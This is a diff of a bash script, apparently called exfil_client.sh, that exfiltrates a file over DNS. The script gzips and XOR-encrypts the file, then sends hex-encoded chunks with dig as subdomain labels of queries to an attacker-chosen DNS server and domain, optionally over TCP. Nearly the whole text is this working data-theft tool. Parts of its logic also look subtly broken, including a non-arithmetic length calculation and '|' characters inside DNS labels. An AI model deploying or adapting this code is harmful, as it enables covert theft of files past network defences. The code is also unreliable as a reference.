@@ -1,47 +1,125 @@
 #!/bin/bash
 
-# Function to display help
-function display_help {
-    echo "Usage: ./exfil_client.sh <file_path> <domain> <dns_server_ip> <use_gzip>"
-    echo "Exfiltrates a file over DNS by sending base64 encoded chunks as DNS queries."
+function show_help {
+    echo "Usage: $0 -f <file_path> -d <domain> -s <dns_server_ip> -p <password> [-t]"
+    echo "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
     echo ""
     echo "Parameters:"
-    echo "  file_path      Path to the file you want to exfiltrate."
-    echo "  domain         Domain to use in DNS queries."
-    echo "  dns_server_ip  IP address of the DNS server."
-    echo "  use_gzip       Set to 'true' to gzip the file before encoding; otherwise, set to 'false'."
+    echo "  -f   Path to the file you want to exfiltrate."
+    echo "  -d   Domain to use in DNS queries."
+    echo "  -s   IP address of the DNS server."
+    echo "  -p   Password to be used in XOR encryption."
+    echo "  -t   Optional flag to use TCP instead of UDP."
     echo ""
     echo "Example:"
-    echo "  ./exfil_client.sh /path/to/your/file example.com 8.8.8.8 true"
+    echo "  $0 -f /path/to/your/file -d example.com -s 8.8.8.8 -p securepass -t"
 }
 
-# Check if there are 4 arguments
-if [ "$#" -ne 4 ]; then
-    display_help
+# Parse parameters
+USE_TCP=0
+while getopts "f:d:s:p:t" opt; do
+    case $opt in
+        f) FILE_PATH=$OPTARG ;;
+        d) DOMAIN=$OPTARG ;;
+        s) DNS_SERVER_IP=$OPTARG ;;
+        p) PASSWORD=$OPTARG ;;
+        t) USE_TCP=1 ;;
+        *) show_help; exit 1 ;;
+    esac
+done
+
+# Check if all required parameters are provided
+if [ -z "$FILE_PATH" ] || [ -z "$DOMAIN" ] || [ -z "$DNS_SERVER_IP" ] || [ -z "$PASSWORD" ]; then
+    show_help
     exit 1
 fi
 
-file_path="$1"
-domain="$2"
-dns_server_ip="$3"
-use_gzip="$4"
-
-data=$(cat "$file_path")
-
-if [ "$use_gzip" = "true" ]; then
-    # Compress file using gzip and base64 encode
-    compressed_data=$(gzip -c "$file_path" | base64 -w0)
-else
-    # Base64 encode without gzip compression
-    compressed_data=$(base64 -w0 "$file_path")
+# Check if file exists
+if [ ! -f "$FILE_PATH" ]; then
+    echo "File not found: $FILE_PATH"
+    exit 1
 fi
 
-max_chunk_length=62
+# XOR encryption function
+function xor_encrypt {
+    local data=("$@")
+    local encrypted=()
+    local password_bytes=($(echo -n "$PASSWORD" | od -An -t u1))
+    local pass_len=${#password_bytes[@]}
 
-for ((i=0; i<${#compressed_data}; i+=max_chunk_length)); do
-    chunk=$(echo -n "${compressed_data:i:max_chunk_length}" | hexdump -v -e '/1 "%02x" ')
-    chunk_1="${chunk:0:$((${#chunk} / 2 ))}"
-    chunk_2="${chunk:$((${#chunk} / 2 ))}"
-    subdomain="${chunk_1}-.${chunk_2}-.${domain}"
-    dig @$dns_server_ip $subdomain
+    for i in "${!data[@]}"; do
+        encrypted+=($(( data[i] ^ password_bytes[i % pass_len] )))
+    done
+
+    echo "${encrypted[@]}"
+}
+
+# Read file content as bytes
+file_bytes=($(od -An -t u1 -v "$FILE_PATH"))
+
+# Get filename and timestamp
+filename=$(basename "$FILE_PATH")
+timestamp=$(date +"%Y%m%d%H%M%S")
+
+# Compress data using gzip
+compressed_data=$(echo -n "${file_bytes[@]}" | gzip -c | od -An -t u1 -v)
+
+# XOR encrypt compressed data with password
+encrypted_data=($(xor_encrypt "${compressed_data[@]}"))
+
+# Convert encrypted data to hexadecimal string
+hex_encrypted_data=$(printf "%02X" "${encrypted_data[@]}")
+
+# Maximum DNS query size constraints
+label_max_size=63
+request_max_size=255
+
+# Calculate space required for domain name and metadata
+domain_name_length=${#DOMAIN}+3
+metadata_length=$(((${#filename} + ${#timestamp} + 6) * 2))
+
+# Calculate maximum bytes available for data in each DNS query
+bytes_left=$((request_max_size - metadata_length - domain_name_length))
+
+# Calculate number of chunks
+nb_chunks=$(((${#hex_encrypted_data} + bytes_left - 1) / bytes_left))
+
+echo "[+] Maximum data exfiltrated per DNS request (chunk max size): [$bytes_left] bytes"
+echo "[+] Number of chunks: [$nb_chunks]"
+
+# Split encrypted data into chunks and send DNS queries
+chunk_id=0
+start_index=0
+
+while [ $chunk_id -lt $nb_chunks ]; do
+    end_index=$((start_index + bytes_left))
+    chunk=${hex_encrypted_data:start_index:end_index-start_index}
+
+    # Split chunk into 4 equal parts
+    chunk_length=$(((end_index - start_index + 3) / 4))
+    chunks=()
+
+    for i in {0..3}; do
+        start=$((i * chunk_length))
+        length=$chunk_length
+        [ $start -ge ${#chunk} ] && break
+        [ $((start + length)) -gt ${#chunk} ] && length=$((${#chunk} - start))
+        chunks+=("${chunk:start:length}")
+    done
+
+    # Construct DNS query
+    hex_filename=$(echo -n "$filename" | od -An -t x1 | tr -d ' \n')
+    metadata="${hex_filename}|${timestamp}|${nb_chunks}"
+    subdomain="${chunk_id}.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.${metadata}.${DOMAIN}"
+
+    # Send DNS query using dig
+    if [ $USE_TCP -eq 1 ]; then
+        dig @$DNS_SERVER_IP +tcp +short "$subdomain" A
+    else
+        dig @$DNS_SERVER_IP +short "$subdomain" A
+    fi
+
+    # Move to next chunk
+    chunk_id=$((chunk_id + 1))
+    start_index=$end_index
 done
